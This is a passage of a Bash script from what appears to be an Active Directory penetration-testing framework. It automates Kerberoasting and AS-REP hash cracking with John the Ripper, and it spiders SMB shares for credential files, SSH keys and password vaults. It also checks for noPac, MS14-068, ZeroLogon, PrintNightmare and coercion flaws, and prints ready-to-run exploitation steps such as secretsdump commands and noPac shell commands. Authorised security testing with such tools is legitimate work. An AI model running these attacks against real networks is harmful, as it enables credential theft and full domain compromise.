                if grep -q 'error' "${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt"; then
                    echo -e "${RED}[-] Errors during Blind Kerberoast Attack... ${NC}"
                else
                    grep "krb5tgs" "${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt" | sed "s/\$krb5tgs\$/:\$krb5tgs\$/" | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' | tee "${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt"
                fi
            else
                echo -e "${PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. Run ASREPRoast attack and try again.${NC}"
            fi
        else
            echo -e "${BLUE}[*] Kerberoast Attack${NC}"
            run_command "${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}" | tee "${output_dir}/Kerberos/kerberoast_list_output_${dc_domain}.txt"
            run_command "${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}" >"${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt"
            #${netexec} ${ne_verbose} smb ${servers_smb_list} "${argument_ne}" --kerberoasting --log ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt" 2>&1
            if grep -q 'error' "${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt"; then
                echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
            else
                grep "krb5tgs" "${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt" | sed "s/\$krb5tgs\$/:\$krb5tgs\$/" | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' >"${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt"
                grep "MSSQLSvc" "${output_dir}/Kerberos/kerberoast_list_output_${dc_domain}.txt" | cut -d '/' -f 2 | cut -d ':' -f 1 | cut -d ' ' -f 1 | sort -u >"${output_dir}/DomainRecon/Servers/sql_list_kerberoast_${dc_domain}.txt"
            fi
        fi
    fi
    echo -e ""
}

krbjack_attack() {
    if [ ! -f "${krbjack}" ]; then
        echo -e "${RED}[-] Please verify the location of krbjack${NC}"
    else
        echo -e "${BLUE}[*] Checking for DNS unsecure updates using krbjack${NC}"
        run_command "${krbjack} check --dc-ip ${dc_ip} --domain ${domain}" 2>&1 | tee "${output_dir}/Kerberos/krbjack_output_${dc_domain}.txt"
        if ! grep -q 'This domain IS NOT vulnerable' "${output_dir}/Kerberos/krbjack_output_${dc_domain}.txt"; then
            echo -e "${GREEN}[+] DNS unsecure updates possible! Follow steps below to abuse the vuln and perform AP_REQ hijacking:${NC}"
            echo -e "${krbjack} run --dc-ip ${dc_ip} --target-ip ${dc_ip} --domain ${domain} --target-name ${dc_NETBIOS} --ports 139,445 --executable <PATH_TO_EXECUTABLE_TO_RUN>"
        fi
    fi
    echo -e ""
}

kerborpheus_attack() {
    if [ ! -f "${orpheus}" ]; then
        echo -e "${RED}[-] orpheus.py not found! Please verify the installation of orpheus${NC}"
    else
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] orpheus requires credentials${NC}"
        else
            echo -e "${BLUE}[*] Kerberoast Attack using Orpheus${NC}"
            current_dir=$(pwd)
            cd "${scripts_dir}/orpheus-main" || exit
            echo "$(date +%Y-%m-%d\ %H:%M:%S); ${orpheus} | tee -a ${output_dir}/Kerberos/orpheus_output_${dc_domain}.txt" >>"$command_log"
            (
                echo -e "cred ${argument_imp}\ndcip ${dc_ip}\nfile ${output_dir}/Kerberos/orpheus_kerberoast_hashes_${dc_domain}.txt\n enc 18\n hex 0x40AC0010"
                cat /dev/tty
            ) | /usr/bin/script -qc "${orpheus}" /dev/null | tee -a "${output_dir}/Kerberos/orpheus_output_${dc_domain}.txt"
            cd "${current_dir}" || exit
        fi
    fi
    echo -e ""
}

nopac_check() {
    echo -e "${BLUE}[*] NoPac (CVE-2021-42278 and CVE-2021-42287) check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] netexec's nopac does not support kerberos authentication${NC}"
    else
        run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M nopac --log ${output_dir}/Vulnerabilities/ne_nopac_output_${dc_domain}.txt" 2>&1
        if grep -q "VULNERABLE" "${output_dir}/Vulnerabilities/ne_nopac_output_${dc_domain}.txt"; then
            echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
            echo -e "${CYAN}# Get shell:${NC}" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
            echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -shell [-use-ldap]" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
            echo -e "${CYAN}# Dump hashes:${NC}" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
            echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -dump [-use-ldap]" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

ms14-068_check() {
    echo -e "${BLUE}[*] MS14-068 check ${NC}"
    if [ ! -f "${impacket_goldenPac}" ]; then
        echo -e "${RED}[-] goldenPac.py not found! Please verify the installation of impacket${NC}"
    else
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] MS14-068 requires credentials and does not support Kerberos authentication${NC}"
        else
            run_command "${impacket_goldenPac} ${argument_imp_gp}\\@${dc_FQDN} None -target-ip ${dc_ip}" 2>&1 | tee "${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt"
            if grep -q "found vulnerable" "${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt"; then
                echo -e "${GREEN}[+] Domain controller vulnerable to MS14-068 found (False positives possible on newer versions of Windows)!${NC}" | tee -a "${output_dir}/Exploitation/ms14-068_exploitation_steps_${dc_domain}.txt"
                echo -e "${CYAN}# Execute command below to get shell:${NC}" | tee -a "${output_dir}/Exploitation/ms14-068_exploitation_steps_${dc_domain}.txt"
                echo -e "${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}" | tee -a "${output_dir}/Exploitation/ms14-068_exploitation_steps_${dc_domain}.txt"
            fi
        fi
    fi
    echo -e ""
}

raise_child() {
    if [ ! -f "${impacket_raiseChild}" ]; then
        echo -e "${RED}[-] raiseChild.py not found! Please verify the installation of impacket ${NC}"
    elif [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] raiseChild requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Running privilege escalation from Child Domain to Parent Domain using raiseChild${NC}"
        run_command "${impacket_raiseChild} ${argument_imp} -w ${output_dir}/Credentials/raiseChild_ccache_${dc_domain}.txt" 2>&1 | tee -a "${output_dir}/Kerberos/impacket_raiseChild_output.txt"
    fi
    echo -e ""
}

john_crack_asrep() {
    if [ ! -f "${john}" ]; then
        echo -e "${RED}[-] Please verify the installation of john${NC}"
    else
        echo -e "${BLUE}[*] Cracking found hashes using john the ripper${NC}"
        if [ ! -s "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" ]; then
            echo -e "${PURPLE}[-] No accounts with Kerberos preauth disabled found${NC}"
        else
            echo -e "${YELLOW}[i] Using $pass_wordlist wordlist...${NC}"
            echo -e "${CYAN}[*] Launching john on collected asreproast hashes. This may take a while...${NC}"
            echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
            run_command "$john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --wordlist=$pass_wordlist"
            echo -e "${GREEN}[+] Printing cracked AS REP Roast hashes...${NC}"
            run_command "$john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --show" | tee "${output_dir}/Kerberos/asreproast_john_results_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

john_crack_kerberoast() {
    if [ ! -f "${john}" ]; then
        echo -e "${RED}[-] Please verify the installation of john${NC}"
    else
        echo -e "${BLUE}[*] Cracking found hashes using john the ripper${NC}"
        if [ ! -s "${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt" ] && [ ! -s "${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt" ]; then
            echo -e "${PURPLE}[-] No SPN accounts found${NC}"
        else
            echo -e "${YELLOW}[i] Using $pass_wordlist wordlist...${NC}"
            echo -e "${CYAN}[*] Launching john on collected kerberoast hashes. This may take a while...${NC}"
            echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
            run_command "$john ${output_dir}/Kerberos/*kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --wordlist=$pass_wordlist"
            echo -e "${GREEN}[+] Printing cracked Kerberoast hashes...${NC}"
            run_command "$john ${output_dir}/Kerberos/*kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --show" | tee "${output_dir}/Kerberos/kerberoast_john_results_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

###### scan_shares: Shares scan
smb_map() {
    if [ ! -f "${smbmap}" ]; then
        echo -e "${RED}[-] Please verify the installation of smbmap${NC}"
    else
        mkdir -p "${output_dir}/Shares/smbmapDump"
        echo -e "${BLUE}[*] SMB shares Scan using smbmap${NC}"
        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] smbmap does not support Kerberos authentication${NC}"
        else
            smb_scan
            echo -e "${BLUE}[*] Listing accessible SMB shares - Step 1/2${NC}"
            grep -v ':' <"${servers_smb_list}" | while IFS= read -r i; do
                echo -e "${CYAN}[*] Listing shares on ${i} ${NC}"
                run_command "${smbmap} -H $i ${argument_smbmap}" | grep -v "Working on it..." >"${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_${i}.txt"
                if [ "${nullsess_bool}" == true ]; then
                    echo -e "${CYAN}[*] smbmap enumeration (Guest and random user)${NC}"
                    run_command "${smbmap} -H $i -u 'Guest' -p ''" | grep -v "Working on it..." >>"${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_${i}.txt"
                    run_command "${smbmap} -H $i -u ${rand_user} p ''" | grep -v "Working on it..." >>"${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_${i}.txt"
                fi
            done

            grep -iaH READ "${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_*.txt" 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print $1 ";"  $2 ";" $3}' >"${output_dir}/Shares/all_network_shares_${dc_domain}.csv"
            grep -iaH READ "${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_*.txt" 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print "\\\\" $1 "\\" $2}' >"${output_dir}/Shares/all_network_shares_${dc_domain}.txt"

            echo -e "${BLUE}[*] Listing files in accessible shares - Step 2/2${NC}"
            grep -v ':' <"${servers_smb_list}" | while IFS= read -r i; do
                echo -e "${CYAN}[*] Listing files in accessible shares on ${i} ${NC}"
                if [ "${kerb_bool}" == true ]; then
                    echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
                else
                    current_dir=$(pwd)
                    mkdir -p "${output_dir}/Shares/smbmapDump/${i}"
                    cd "${output_dir}/Shares/smbmapDump/${i}" || exit
                    run_command "${smbmap} -H $i ${argument_smbmap} -A '\.cspkg|\.publishsettings|\.xml|\.json|\.ini|\.bat|\.log|\.pl|\.py|\.ps1|\.txt|\.config|\.conf|\.cnf|\.sql|\.yml|\.cmd|\.vbs|\.php|\.cs|\.inf' -r --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$'" | grep -v "Working on it..." >"${output_dir}/Shares/smbmapDump/smb_files_${dc_domain}_${i}.txt"
                    if [ "${nullsess_bool}" == true ]; then
                        echo -e "${CYAN}[*] smbmap enumeration (Guest and random user)${NC}"
                        run_command "${smbmap} -H $i -u 'Guest' -p '' -A '\.cspkg|\.publishsettings|\.xml|\.json|\.ini|\.bat|\.log|\.pl|\.py|\.ps1|\.txt|\.config|\.conf|\.cnf|\.sql|\.yml|\.cmd|\.vbs|\.php|\.cs|\.inf' -r --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$'" | grep -v "Working on it..." >>"${output_dir}/Shares/smbmapDump/smb_files_${dc_domain}_${i}.txt"
                        run_command "${smbmap} -H $i -u ${rand_user} -p '' -A '\.cspkg|\.publishsettings|\.xml|\.json|\.ini|\.bat|\.log|\.pl|\.py|\.ps1|\.txt|\.config|\.conf|\.cnf|\.sql|\.yml|\.cmd|\.vbs|\.php|\.cs|\.inf' -r --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$'" | grep -v "Working on it..." >>"${output_dir}/Shares/smbmapDump/smb_files_${dc_domain}_${i}.txt"
                    fi
                    cd "${current_dir}" || exit
                fi
            done
        fi
    fi
    echo -e ""
}

ne_shares() {
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    echo -e "${BLUE}[*] Enumerating Shares using netexec ${NC}"
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} --shares --log ${output_dir}/Shares/ne_shares_output_${dc_domain}.txt" 2>&1
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${BLUE}[*] Enumerating Shares using netexec (Guest and random user)${NC}"
        run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} -u Guest -p '' --shares --log ${output_dir}/Shares/ne_shares_nullsess_output_${dc_domain}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} -u ${rand_user} -p '' --shares --log ${output_dir}/Shares/ne_shares_nullsess_output_${dc_domain}.txt" 2>&1
    fi

    echo -e ""
}

ne_spider() {
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    echo -e "${BLUE}[*] Spidering Shares using netexec ${NC}"
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M spider_plus -o OUTPUT=${output_dir}/Shares/ne_spider_plus EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON --log ${output_dir}/Shares/ne_spider_output_${dc_domain}.txt" 2>&1
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${BLUE}[*] Spidering Shares using netexec (Guest and random user)${NC}"
        run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} -u Guest -p '' -M spider_plus -o OUTPUT=${output_dir}/Shares/ne_spider_plus EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON --log ${output_dir}/Shares/ne_spider_nullsess_output_${dc_domain}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} -u ${rand_user} -p '' -M spider_plus -o OUTPUT=${output_dir}/Shares/ne_spider_plus EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON --log ${output_dir}/Shares/ne_spider_nullsess_output_${dc_domain}.txt" 2>&1
    fi
    echo -e ""
}

finduncshar_scan() {
    if [ ! -f "${FindUncommonShares}" ]; then
        echo -e "${RED}[-] Please verify the installation of FindUncommonShares${NC}"
    else
        echo -e "${BLUE}[*] Enumerating Shares using FindUncommonShares${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] FindUncommonShares requires credentials ${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v --debug"; else verbose_p0dalirius=""; fi
            run_command "${FindUncommonShares} ${argument_FindUncom} ${verbose_p0dalirius} ${ldaps_param} -ai ${dc_ip} -tf ${servers_smb_list} --check-user-access --export-xlsx ${output_dir}/Shares/finduncshar_${dc_domain}.xlsx" 2>&1 | tee -a "${output_dir}/Shares/finduncshar_shares_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

manspider_scan() {
    echo -e "${BLUE}[*] Spidering Shares using manspider ${NC}"
    if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
        echo -e "${PURPLE}[-] manspider does not support Kerberos authentication${NC}"
    else
        mkdir -p "${output_dir}/Shares/manspiderDump"
        echo -e "${CYAN}[*] Running manspider....${NC}"
        smb_scan
        echo -e "${CYAN}[*] Searching for files with interesting filenames${NC}"
        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -f passw user admin account network login key logon cred -l ${output_dir}/Shares/manspiderDump" 2>&1 | tee -a "${output_dir}/Shares/manspider_output_${dc_domain}.txt"
        echo -e "${CYAN}[*] Searching for SSH keys${NC}"
        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e ppk rsa pem ssh rsa -o -f id_rsa id_dsa id_ed25519 -l ${output_dir}/Shares/manspiderDump" 2>&1 | tee -a "${output_dir}/Shares/manspider_output_${dc_domain}.txt"
        echo -e "${CYAN}[*] Searching for files with interesting extensions${NC}"
        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config xml cspkg publishsettings json cnf sql cmd -l ${output_dir}/Shares/manspiderDump" 2>&1 | tee -a "${output_dir}/Shares/manspider_output_${dc_domain}.txt"
        echo -e "${CYAN}[*] Searching for Password manager files${NC}"
        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e kdbx kdb 1pif agilekeychain opvault lpd dashlane psafe3 enpass bwdb msecure stickypass pwm rdb safe zps pmvault mywallet jpass pwmdb -l ${output_dir}/Shares/manspiderDump" 2>&1 | tee -a "${output_dir}/Shares/manspider_output_${dc_domain}.txt"
        echo -e "${CYAN}[*] Searching for word passw in documents${NC}"
        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -c passw login -e docx xlsx xls pdf pptx csv -l ${output_dir}/Shares/manspiderDump" 2>&1 | tee -a "${output_dir}/Shares/manspider_output_${dc_domain}.txt"
        echo -e "${CYAN}[*] Searching for words in downloaded files${NC}"
        run_command "${manspider} ${output_dir}/Shares/manspiderDump -q -t 100 -c passw key login -l ${output_dir}/Shares/manspiderDump" 2>&1 | tee -a "${output_dir}/Shares/manspider_output_${dc_domain}.txt"
        echo -e ""
    fi
}

smbclient_console() {
    if [ ! -f "${impacket_smbclient}" ]; then
        echo -e "${RED}[-] smbclient.py not found! Please verify the installation of impacket ${NC}"
    else
        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
        read -rp ">> " smbclient_target </dev/tty
        while [ "${smbclient_target}" == "" ]; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -rp ">> " smbclient_target </dev/tty
        done
        echo -e "${BLUE}[*] Opening smbclient.py console on target: $smbclient_target ${NC}"
        if [ "${nullsess_bool}" == true ]; then
            run_command "${impacket_smbclient} ${argument_imp}Guest:''\\@${smbclient_target}" 2>&1 | tee -a "${output_dir}/Shares/impacket_smbclient_output.txt"
        else
            run_command "${impacket_smbclient} ${argument_imp}\\@${smbclient_target}" 2>&1 | tee -a "${output_dir}/Shares/impacket_smbclient_output.txt"
        fi
    fi
    echo -e ""
}

smbclientng_console() {
    if [ ! -f "${smbclientng}" ]; then
        echo -e "${RED}[-] Please verify the installation of smbclientng${NC}"
    else
        echo -e "${BLUE}[*] Launching smbclientng${NC}"
        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
        read -rp ">> " smbclient_target </dev/tty
        while [ "${smbclient_target}" == "" ]; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -rp ">> " smbclient_target </dev/tty
        done
        if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="--debug"; else verbose_p0dalirius=""; fi
        run_command "${smbclientng} ${argument_p0dalirius} ${verbose_p0dalirius} --target ${smbclient_target} --kdcHost ${dc_FQDN}" 2>&1 | tee -a "${output_dir}/Shares/smbclientng_output_${dc_domain}.txt"
    fi
    echo -e ""
}

###### vuln_checks: Vulnerability checks
zerologon_check() {
    echo -e "${BLUE}[*] zerologon check. This may take a while... ${NC}"
    run_command "echo -n Y | ${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M zerologon --log ${output_dir}/Vulnerabilities/ne_zerologon_output_${dc_domain}.txt" 2>&1
    if grep -q "VULNERABLE" "${output_dir}/Vulnerabilities/ne_zerologon_output_${dc_domain}.txt"; then
        echo -e "${GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
        echo -e "${CYAN}1. Exploit the vulnerability, set the NT hash to \\x00*8:${NC}" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
        echo -e "cve-2020-1472-exploit.py $dc_NETBIOS $dc_ip" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
        echo -e "${CYAN}2. Obtain the Domain Admin's NT hash:${NC}" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
        echo -e "secretsdump.py $dc_domain/$dc_NETBIOS\$@$dc_ip -no-pass -just-dc-user Administrator" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
        echo -e "${CYAN}3. Obtain the machine account hex encoded password:${NC}" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
        echo -e "secretsdump.py -hashes :<NTLMhash_Administrator> $dc_domain/Administrator@$dc_ip" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
        echo -e "${CYAN}4. Restore the machine account password:${NC}" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
        echo -e "restorepassword.py -target-ip $dc_ip $dc_domain/$dc_NETBIOS@$dc_NETBIOS -hexpass <HexPass_$dc_NETBIOS>" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
    fi
    echo -e ""
}

ms17-010_check() {
    echo -e "${BLUE}[*] MS17-010 check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M ms17-010 --log ${output_dir}/Vulnerabilities/ne_ms17-010_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

petitpotam_check() {
    echo -e "${BLUE}[*] PetitPotam check ${NC}"
    run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M petitpotam --log ${output_dir}/Vulnerabilities/ne_petitpotam_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

dfscoerce_check() {
    echo -e "${BLUE}[*] dfscoerce check ${NC}"
    run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M dfscoerce --log ${output_dir}/Vulnerabilities/ne_dfscoerce_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

spooler_check() {
    echo -e "${BLUE}[*] Print Spooler check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M spooler --log ${output_dir}/Vulnerabilities/ne_spooler_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

printnightmare_check() {
    echo -e "${BLUE}[*] Print Nightmare check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M printnightmare --log ${output_dir}/Vulnerabilities/ne_printnightmare_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

webdav_check() {
    echo -e "${BLUE}[*] WebDAV check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M webdav --log ${output_dir}/Vulnerabilities/ne_webdav_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

shadowcoerce_check() {
    echo -e "${BLUE}[*] shadowcoerce check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M shadowcoerce --log ${output_dir}/Vulnerabilities/ne_shadowcoerce_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

smbsigning_check() {
    echo -e "${BLUE}[*] Listing servers with SMB signing disabled or not required ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} --gen-relay-list ${output_dir}/Vulnerabilities/ne_smbsigning_output_${dc_domain}.txt" 2>&1
    if [ ! -s "${output_dir}/Vulnerabilities/ne_smbsigning_output_${dc_domain}.txt" ]; then
        echo -e "${PURPLE}[-] No servers with SMB signing disabled found ${NC}"
    fi
    echo -e ""
}

ntlmv1_check() {
    echo -e "${BLUE}[*] ntlmv1 check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M ntlmv1 --log ${output_dir}/Vulnerabilities/ne_ntlmv1_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

runasppl_check() {
    echo -e "${BLUE}[*] runasppl check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M runasppl --log ${output_dir}/Vulnerabilities/ne_runasppl_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

rpcdump_check() {
    if [ ! -f "${impacket_rpcdump}" ]; then
        echo -e "${RED}[-] rpcdump.py not found! Please verify the installation of impacket${NC}"
    elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
        echo -e "${PURPLE}[-] rpcdump does not support Kerberos authentication${NC}"
    else
        mkdir -p "${output_dir}/Vulnerabilities/RPCDump"
        echo -e "${BLUE}[*] Impacket rpcdump${NC}"
        smb_scan
        while IFS= read -r i; do
            # Your loop body here
            echo -e "${CYAN}[*] RPC Dump of ${i} ${NC}"
            run_command "${impacket_rpcdump} ${argument_imp}\\@$i" >"${output_dir}/Vulnerabilities/RPCDump/impacket_rpcdump_output_${i}.txt"
            inte_prot="MS-RPRN MS-PAR MS-EFSR MS-FSRVP MS-DFSNM MS-EVEN"
            for prot in $inte_prot; do
                prot_grep=$(grep -a "$prot" "${output_dir}/Vulnerabilities/RPCDump/impacket_rpcdump_output_${i}.txt")
                if [ ! "${prot_grep}" == "" ]; then
                    echo -e "${GREEN}[+] $prot_grep found at ${i}${NC}"
                fi
            done
        done <"${servers_smb_list}"
        echo -e ""
    fi
    echo -e ""
}

coercer_check() {
    if [ ! -f "${coercer}" ]; then
        echo -e "${RED}[-] Coercer not found! Please verify the installation of Coercer${NC}"
    elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
        echo -e "${PURPLE}[-] Coercer does not support Kerberos authentication${NC}"
    else
        mkdir -p "${output_dir}/Vulnerabilities/Coercer"
        echo -e "${BLUE}[*] Running scan using coercer ${NC}"
        smb_scan
        run_command "${coercer} scan ${argument_coercer} -f ${servers_smb_list} --dc-ip $dc_ip --auth-type smb --export-xlsx ${output_dir}/Vulnerabilities/Coercer/coercer_output_${dc_domain}.xlsx" | tee "${output_dir}/Vulnerabilities/Coercer/coercer_output_${dc_domain}.txt"
        if grep -q -r "SMB  Auth" "${output_dir}/Vulnerabilities/Coercer/"; then
            echo -e "${GREEN}[+] Servers vulnerable to Coerce attacks found! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Exploitation/coercer_exploitation_steps_${dc_domain}.txt"
            echo -e "${CYAN}1. Run responder on second terminal to capture hashes:${NC}" | tee -a "${output_dir}/Exploitation/coercer_exploitation_steps_${dc_domain}.txt"
